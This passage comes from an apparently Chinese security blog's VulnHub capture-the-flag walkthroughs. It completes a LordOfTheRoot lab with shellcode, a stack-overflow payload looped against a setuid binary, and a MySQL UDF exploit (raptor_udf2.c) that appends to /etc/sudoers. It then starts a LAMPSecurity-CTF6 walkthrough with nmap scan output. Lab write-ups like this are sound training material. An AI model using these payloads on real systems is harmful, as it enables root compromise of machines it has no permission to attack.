<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80</span><br></pre></td></tr></table></figure>

<p>在当前的GDB会话中测试payload，以确认漏洞利用程序是否正常工作：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(gdb) run $(python -c <span class="string">&#x27;print &quot;A&quot; * 171 + &quot;\x70\xee\xff\xbf&quot; + &quot;\x90&quot; * 2000 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;&#x27;</span>)</span><br><span class="line">The program being debugged has been started already.</span><br><span class="line">Start it from the beginning? (y or n) y</span><br><span class="line"></span><br><span class="line">Starting program: /tmp/file $(python -c <span class="string">&#x27;print &quot;A&quot; * 171 + &quot;\x70\xee\xff\xbf&quot; + &quot;\x90&quot; * 2000 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;&#x27;</span>)</span><br><span class="line">process 30271 is executing new program: /bin/dash</span><br><span class="line">$ id</span><br><span class="line">uid=1000(smeagol) gid=1000(smeagol) groups=1000(smeagol)</span><br><span class="line">$ whoami</span><br><span class="line">smeagol</span><br></pre></td></tr></table></figure>

<p>优秀！产生了一个shell。但是，以smeagol的身份运行，而不是以root用户身份运行，因为这只是我复制下来的文件。另外，请务必注意，我的EIP地址位置“\x70\xee\xff\xbf”<br>由于字节序少，所以反向写入。</p>
<p>现在，我知道我的漏洞利用程序有用，现在是时候将该漏洞循环到真实环境中了。使用以下脚本来完成此任务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> &#123;1..1000&#125;; <span class="keyword">do</span> ./file $(python -c <span class="string">&#x27;print &quot;A&quot; * 171 + &quot;\x70\xee\xff\xbf&quot; + &quot;\x90&quot; * 2000 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;&#x27;</span>); <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>准备好漏洞利用程序后，回到/SECRET/目录并找到适当的文件并执行脚本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smeagol@LordOfTheRoot:/SECRET$ file door1/file door2/file door3/file</span><br><span class="line">door1/file: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=364b5cbb85546e36256039ce4599eee471bfbf86, not stripped</span><br><span class="line">door2/file: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=364b5cbb85546e36256039ce4599eee471bfbf86, not stripped</span><br><span class="line">door3/file: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=9e50c7cacaf5cc2c78214c81f110c88e61ad0c10, not stripped</span><br></pre></td></tr></table></figure>
<p>运行下面的命令，成功提权如下所示。。。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> &#123;1..1000&#125;; <span class="keyword">do</span> /SECRET/door3/file $(python -c <span class="string">&#x27;print &quot;A&quot; * 171 + &quot;\x70\xee\xff\xbf&quot; + &quot;\x90&quot; * 2000 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;&#x27;</span>); <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Segmentation fault (core dumped)</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=1000(smeagol) gid=1000(smeagol) euid=0(root) groups=0(root),1000(smeagol)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>读取flag</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls                                                                                                                                                                                                                                       </span></span><br><span class="line">Flag.txt  buf  buf.c  other  other.c  switcher.py                                                                                                                                                                                          </span><br><span class="line"><span class="comment"># cat Flag.txt                                                                                                                                                                                                                             </span></span><br><span class="line">“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”                                                                                                                                   </span><br><span class="line">– Gandalf</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub186.jpg"></p>
<h3 id="提权3-mysql-udf提权"><a href="#提权3-mysql-udf提权" class="headerlink" title="提权3:mysql-udf提权"></a>提权3:mysql-udf提权</h3><p>使用sqlmap dump出mysql的用户名和密码的hash值，之前的步骤略</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -u http://192.168.56.113:1337/978345210/index.php --forms --batch -D mysql -T user --dump</span></span><br><span class="line">root             | &lt;blank&gt; | *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F |</span><br><span class="line">root             | &lt;blank&gt; | *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F |</span><br><span class="line">debian-sys-maint | &lt;blank&gt; | *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F | </span><br><span class="line">root             | &lt;blank&gt; | *A55A9B9049F69BC2768C9284615361DFBD580B34 |</span><br><span class="line">root             | &lt;blank&gt; | *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F |</span><br></pre></td></tr></table></figure>

<p>解密出</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*4DD56158ACDBA81BFE3FF9D3D7375231596CE10F</span><br></pre></td></tr></table></figure>

<p>的值是darkshadow<br>然后用之前的账号和密码先连接ssh</p>
<p>searchsploit搜索mysql udf提权exploit</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># searchsploit User-Defined Function</span></span><br><span class="line">---------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                                                    |  Path</span><br><span class="line">                                                                                  | (/usr/share/exploitdb/)</span><br><span class="line">---------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Microsoft Edge Chakra JIT - Op_MaxInAnArray and Op_MinInAnArray can Explicitly ca | exploits/windows/dos/43466.js</span><br><span class="line">MySQL 4.0.17 (Linux) - User-Defined Function (UDF) Dynamic Library (1)            | exploits/linux/<span class="built_in">local</span>/1181.c</span><br><span class="line">MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)           | exploits/linux/<span class="built_in">local</span>/1518.c</span><br><span class="line">MySQL 4.x/5.0 (Windows) - User-Defined Function Command Execution                 | exploits/windows/remote/3274.txt</span><br><span class="line">---------------------------------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br><span class="line">root@kali:~<span class="comment"># cat /usr/share/exploitdb/exploits/linux/local/1518.c</span></span><br><span class="line">/*</span><br><span class="line"> * <span class="variable">$Id</span>: raptor_udf2.c,v 1.1 2006/01/18 17:58:54 raptor Exp $</span><br><span class="line"> *</span><br><span class="line"> * raptor_udf2.c - dynamic library <span class="keyword">for</span> do_system() MySQL UDF</span><br><span class="line"> * Copyright (c) 2006 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;</span><br><span class="line"> *</span><br><span class="line"> * This is an helper dynamic library <span class="keyword">for</span> <span class="built_in">local</span> privilege escalation through</span><br><span class="line"> * MySQL run with root privileges (very bad idea!), slightly modified to work </span><br><span class="line"> * with newer versions of the open-source database. Tested on MySQL 4.1.14.</span><br><span class="line"> *</span><br><span class="line"> * See also: http://www.0xdeadbeef.info/exploits/raptor_udf.c</span><br><span class="line"> *</span><br><span class="line"> * Starting from MySQL 4.1.10a and MySQL 4.0.24, newer releases include fixes</span><br><span class="line"> * <span class="keyword">for</span> the security vulnerabilities <span class="keyword">in</span> the handling of User Defined Functions</span><br><span class="line"> * (UDFs) reported by Stefano Di Paola &lt;stefano.dipaola@wisec.it&gt;. For further</span><br><span class="line"> * details, please refer to:</span><br><span class="line"> *</span><br><span class="line"> * http://dev.mysql.com/doc/refman/5.0/en/udf-security.html</span><br><span class="line"> * http://www.wisec.it/vulns.php?page=4</span><br><span class="line"> * http://www.wisec.it/vulns.php?page=5</span><br><span class="line"> * http://www.wisec.it/vulns.php?page=6</span><br><span class="line"> *</span><br><span class="line"> * <span class="string">&quot;UDFs should have at least one symbol defined in addition to the xxx symbol </span></span><br><span class="line"><span class="string"> * that corresponds to the main xxx() function. These auxiliary symbols </span></span><br><span class="line"><span class="string"> * correspond to the xxx_init(), xxx_deinit(), xxx_reset(), xxx_clear(), and </span></span><br><span class="line"><span class="string"> * xxx_add() functions&quot;</span>. -- User Defined Functions Security Precautions </span><br><span class="line"> *</span><br><span class="line"> * Usage:</span><br><span class="line"> * $ id</span><br><span class="line"> * uid=500(raptor) gid=500(raptor) groups=500(raptor)</span><br><span class="line"> * $ gcc -g -c raptor_udf2.c</span><br><span class="line"> * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span><br><span class="line"> * $ mysql -u root -p</span><br><span class="line"> * Enter password:</span><br><span class="line"> * [...]</span><br><span class="line"> * mysql&gt; use mysql;</span><br><span class="line"> * mysql&gt; create table foo(line blob);</span><br><span class="line"> * mysql&gt; insert into foo values(load_file(<span class="string">&#x27;/home/raptor/raptor_udf2.so&#x27;</span>));</span><br><span class="line"> * mysql&gt; select * from foo into dumpfile <span class="string">&#x27;/usr/lib/raptor_udf2.so&#x27;</span>;</span><br><span class="line"> * mysql&gt; create <span class="keyword">function</span> do_system returns <span class="built_in">integer</span> soname <span class="string">&#x27;raptor_udf2.so&#x27;</span>;</span><br><span class="line"> * mysql&gt; select * from mysql.func;</span><br><span class="line"> * +-----------+-----+----------------+----------+</span><br><span class="line"> * | name      | ret | dl             | <span class="built_in">type</span>     |</span><br><span class="line"> * +-----------+-----+----------------+----------+</span><br><span class="line"> * | do_system |   2 | raptor_udf2.so | <span class="keyword">function</span> |</span><br><span class="line"> * +-----------+-----+----------------+----------+</span><br><span class="line"> * mysql&gt; select do_system(<span class="string">&#x27;id &gt; /tmp/out; chown raptor.raptor /tmp/out&#x27;</span>);</span><br><span class="line"> * mysql&gt; \! sh</span><br><span class="line"> * sh-2.05b$ cat /tmp/out</span><br><span class="line"> * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)</span><br><span class="line"> * [...]</span><br><span class="line"> *</span><br><span class="line"> * E-DB Note: Keep an eye on https://github.com/mysqludf/lib_mysqludf_sys</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line">enum Item_result &#123;STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT&#125;;</span><br><span class="line"></span><br><span class="line">typedef struct st_udf_args &#123;</span><br><span class="line">        unsigned int            arg_count;      // number of arguments</span><br><span class="line">        enum Item_result        *arg_type;      // pointer to item_result</span><br><span class="line">        char                    **args;         // pointer to arguments</span><br><span class="line">        unsigned long           *lengths;       // length of string args</span><br><span class="line">        char                    *maybe_null;    // 1 <span class="keyword">for</span> maybe_null args</span><br><span class="line">&#125; UDF_ARGS;</span><br><span class="line"></span><br><span class="line">typedef struct st_udf_init &#123;</span><br><span class="line">        char                    maybe_null;     // 1 <span class="keyword">if</span> func can <span class="built_in">return</span> NULL</span><br><span class="line">        unsigned int            decimals;       // <span class="keyword">for</span> real <span class="built_in">functions</span></span><br><span class="line">        unsigned long           max_length;     // <span class="keyword">for</span> string <span class="built_in">functions</span></span><br><span class="line">        char                    *ptr;           // free ptr <span class="keyword">for</span> func data</span><br><span class="line">        char                    const_item;     // 0 <span class="keyword">if</span> result is constant</span><br><span class="line">&#125; UDF_INIT;</span><br><span class="line"></span><br><span class="line">int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span> (args-&gt;arg_count != 1)</span><br><span class="line">                <span class="built_in">return</span>(0);</span><br><span class="line"></span><br><span class="line">        system(args-&gt;args[0]);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span>(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">return</span>(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// milw0rm.com [2006-02-20]</span><br></pre></td></tr></table></figure>

<p>将下面的代码命名为raptor_udf2.c</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line">enum Item_result &#123;STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT&#125;;</span><br><span class="line"></span><br><span class="line">typedef struct st_udf_args &#123;</span><br><span class="line">        unsigned int            arg_count;      // number of arguments</span><br><span class="line">        enum Item_result        *arg_type;      // pointer to item_result</span><br><span class="line">        char                    **args;         // pointer to arguments</span><br><span class="line">        unsigned long           *lengths;       // length of string args</span><br><span class="line">        char                    *maybe_null;    // 1 <span class="keyword">for</span> maybe_null args</span><br><span class="line">&#125; UDF_ARGS;</span><br><span class="line"></span><br><span class="line">typedef struct st_udf_init &#123;</span><br><span class="line">        char                    maybe_null;     // 1 <span class="keyword">if</span> func can <span class="built_in">return</span> NULL</span><br><span class="line">        unsigned int            decimals;       // <span class="keyword">for</span> real <span class="built_in">functions</span></span><br><span class="line">        unsigned long           max_length;     // <span class="keyword">for</span> string <span class="built_in">functions</span></span><br><span class="line">        char                    *ptr;           // free ptr <span class="keyword">for</span> func data</span><br><span class="line">        char                    const_item;     // 0 <span class="keyword">if</span> result is constant</span><br><span class="line">&#125; UDF_INIT;</span><br><span class="line"></span><br><span class="line">int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span> (args-&gt;arg_count != 1)</span><br><span class="line">                <span class="built_in">return</span>(0);</span><br><span class="line"></span><br><span class="line">        system(args-&gt;args[0]);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">return</span>(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">return</span>(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行下面命令编译</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smeagol@LordOfTheRoot:~$ gcc -g -c raptor_udf2.c</span><br><span class="line">smeagol@LordOfTheRoot:~$ gcc -g -shared -Wl,-soname,raptor_udf2.so -oraptor_udf2.so raptor_udf2.o -lc</span><br><span class="line">smeagol@LordOfTheRoot:~$ ls</span><br><span class="line">39166.c  Documents  examples.desktop  Music     Public         raptor_udf2.o   Templates</span><br><span class="line">Desktop  Downloads  exp               Pictures  raptor_udf2.c  raptor_udf2.so  Videos</span><br></pre></td></tr></table></figure>

<p>最后连接mysql数据库执行下面命令提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smeagol@LordOfTheRoot:~$ mysql -uroot -pdarkshadow</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 9781</span><br><span class="line">Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; use mysql;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; create table foo(line blob);</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into foo values(load_file(<span class="string">&#x27;/home/smeagol/raptor_udf2.so&#x27;</span>));</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from foo into dumpfile <span class="string">&#x27;/usr/lib/mysql/plugin/raptor_udf2.so&#x27;</span>;</span><br><span class="line">Query OK, 1 row affected (0.08 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; create <span class="keyword">function</span> do_system returns <span class="built_in">integer</span> soname <span class="string">&#x27;raptor_udf2.so&#x27;</span>;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from mysql.func;</span><br><span class="line">+-----------+-----+----------------+----------+</span><br><span class="line">| name      | ret | dl             | <span class="built_in">type</span>     |</span><br><span class="line">+-----------+-----+----------------+----------+</span><br><span class="line">| do_system |   2 | raptor_udf2.so | <span class="keyword">function</span> |</span><br><span class="line">+-----------+-----+----------------+----------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select do_system(<span class="string">&#x27;echo &quot;smeagol ALL =(ALL) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers&#x27;</span>);</span><br><span class="line">+----------------------------------------------------------------------+</span><br><span class="line">| do_system(<span class="string">&#x27;echo &quot;smeagol ALL =(ALL) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers&#x27;</span>) |</span><br><span class="line">+----------------------------------------------------------------------+</span><br><span class="line">|                                                                    0 |</span><br><span class="line">+----------------------------------------------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.02 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; quit</span><br><span class="line">Bye</span><br><span class="line">smeagol@LordOfTheRoot:~$ sudo bash</span><br><span class="line">root@LordOfTheRoot:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@LordOfTheRoot:~<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@LordOfTheRoot:~<span class="comment"># cd /root</span></span><br><span class="line">root@LordOfTheRoot:/root<span class="comment"># ls</span></span><br><span class="line">buf  buf.c  Flag.txt  other  other.c  switcher.py</span><br><span class="line">root@LordOfTheRoot:/root<span class="comment"># cat Flag.txt </span></span><br><span class="line">“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”</span><br><span class="line">– Gandalf</span><br><span class="line">root@LordOfTheRoot:/root<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>可以看到，成功的提权了</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub187.jpg"></p>
<h4 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h4><ul>
<li>端口碰撞</li>
<li>sql注入时间盲注</li>
<li>“overlayfs”本地权限提升</li>
<li>利用SUID利用root拥有的二进制文件提权</li>
<li>gdb调试得到python shellcode的poc</li>
<li>mysql-udf提权</li>
</ul>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[LAMPSecurity-CTF6]</title>
    <url>/2019/12/16/LAMPSecurity-CTF6/</url>
    <content><![CDATA[<p>名称：LAMPSecurity-CTF6<br>发布日期：2009年6月29日</p>
<p>下载：</p>
<ul>
<li>Download: <span class="exturl" data-url="aHR0cDovL3NvdXJjZWZvcmdlLm5ldC9wcm9qZWN0cy9sYW1wc2VjdXJpdHkvZmlsZXMvQ2FwdHVyZVRoZUZsYWcvQ1RGNi9sYW1wc2VjdXJpdHlfY3RmNi56aXAvZG93bmxvYWQ=">http://sourceforge.net/projects/lampsecurity/files/CaptureTheFlag/CTF6/lampsecurity_ctf6.zip/download<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9sYW1wc2VjdXJpdHkvY3RmNi56aXA=">https://download.vulnhub.com/lampsecurity/ctf6.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9sYW1wc2VjdXJpdHkvY3RmNi56aXAudG9ycmVudA==">https://download.vulnhub.com/lampsecurity/ctf6.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>描述：</p>
<p>LAMPSecurity项目旨在产生可用于培训信息安全专业人员和测试产品的培训和基准测试工具。 请注意，还有其他捕获flag练习（不仅仅是最新的一种）。 检查SourceForge站点以找到其他可用的练习（<span class="exturl" data-url="aHR0cDovL3NvdXJjZWZvcmdlLm5ldC9wcm9qZWN0cy9sYW1wc2VjdXJpdHkvZmlsZXMvQ2FwdHVyZVRoZUZsYWcvJUVGJUJDJTg5JUUzJTgwJTgy">http://sourceforge.net/projects/lampsecurity/files/CaptureTheFlag/）。<i class="fa fa-external-link-alt"></i></span></p>
<p>通过遵循本文档，可以将这些练习用于培训目的。 另外，您可能希望使用CTF虚拟机作为目标来测试新工具。 这对于评估漏洞发现或渗透测试工具的有效性特别有用。</p>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.142.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.142.129</span><br><span class="line">Host is up (0.00034s latency).</span><br><span class="line">MAC Address: 00:0C:29:32:79:F3 (VMware)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -A -v -sV -Pn -T4 --script=vuln 192.168.142.129</span></span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">22/tcp   open  ssh        OpenSSH 4.3 (protocol 2.0)</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| vulners: </span><br><span class="line">|   cpe:/a:openbsd:openssh:4.3: </span><br><span class="line">|       CVE-2006-5051   9.3     https://vulners.com/cve/CVE-2006-5051</span><br><span class="line">|       CVE-2006-4924   7.8     https://vulners.com/cve/CVE-2006-4924</span><br><span class="line">|       CVE-2014-1692   7.5     https://vulners.com/cve/CVE-2014-1692</span><br><span class="line">|       CVE-2010-4478   7.5     https://vulners.com/cve/CVE-2010-4478</span><br><span class="line">|       CVE-2007-4752   7.5     https://vulners.com/cve/CVE-2007-4752</span><br><span class="line">|       CVE-2009-2904   6.9     https://vulners.com/cve/CVE-2009-2904</span><br><span class="line">|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906</span><br><span class="line">|       CVE-2016-10708  5.0     https://vulners.com/cve/CVE-2016-10708</span><br><span class="line">|       CVE-2010-5107   5.0     https://vulners.com/cve/CVE-2010-5107</span><br><span class="line">|       CVE-2008-4109   5.0     https://vulners.com/cve/CVE-2008-4109</span><br><span class="line">|       CVE-2007-2243   5.0     https://vulners.com/cve/CVE-2007-2243</span><br><span class="line">|       CVE-2006-5052   5.0     https://vulners.com/cve/CVE-2006-5052</span><br><span class="line">|       CVE-2010-4755   4.0     https://vulners.com/cve/CVE-2010-4755</span><br><span class="line">|       CVE-2012-0814   3.5     https://vulners.com/cve/CVE-2012-0814</span><br><span class="line">|       CVE-2011-5000   3.5     https://vulners.com/cve/CVE-2011-5000</span><br><span class="line">|       CVE-2011-4327   2.1     https://vulners.com/cve/CVE-2011-4327</span><br><span class="line">|_      CVE-2008-3259   1.2     https://vulners.com/cve/CVE-2008-3259</span><br><span class="line">80/tcp   open  http       Apache httpd 2.2.3 ((CentOS))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not <span class="built_in">set</span></span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.142.129</span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.142.129:80/mail/</span><br><span class="line">|     Form id: rcmlogintz</span><br><span class="line">|     Form action: ./</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.142.129:80/?action=login</span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: ?action=login</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.142.129:80/mail/?_task=mail</span><br><span class="line">|     Form id: rcmlogintz</span><br><span class="line">|     Form action: ./</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.142.129:80/mail/</span><br><span class="line">|     Form id: rcmlogintz</span><br><span class="line">|_    Form action: ./</span><br><span class="line">|_http-dombased-xss: Couldn<span class="string">&#x27;t find any DOM based XSS.</span></span><br><span class="line"><span class="string">| http-enum: </span></span><br><span class="line"><span class="string">|   /mail/: Mail folder</span></span><br><span class="line"><span class="string">|   /logs/: Logs (401 Authorization Required)</span></span><br><span class="line"><span class="string">|   /phpmyadmin/: phpMyAdmin</span></span><br><span class="line"><span class="string">|   /css/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.2.3 (centos)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|   /docs/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.2.3 (centos)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|   /files/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.2.3 (centos)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|   /icons/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.2.3 (centos)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|   /inc/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.2.3 (centos)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|   /js/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.2.3 (centos)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|   /lib/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.2.3 (centos)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|   /manual/: Potentially interesting folder</span></span><br><span class="line"><span class="string">|   /sql/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.2.3 (centos)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|_  /templates/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.2.3 (centos)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">|_http-server-header: Apache/2.2.3 (CentOS)</span></span><br><span class="line"><span class="string">| http-sql-injection: </span></span><br><span class="line"><span class="string">|   Possible sqli for queries:</span></span><br><span class="line"><span class="string">|     http://192.168.142.129:80/mail/program/js/?C=M%3bO%3dA%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.142.129:80/mail/program/js/?C=S%3bO%3dA%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|     http://192.168.142.129:80/mail/program/js/?C=D%3bO%3dA%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|_    http://192.168.142.129:80/mail/program/js/?C=N%3bO%3dD%27%20OR%20sqlspider</span></span><br><span class="line"><span class="string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-trace: TRACE is enabled</span><br><span 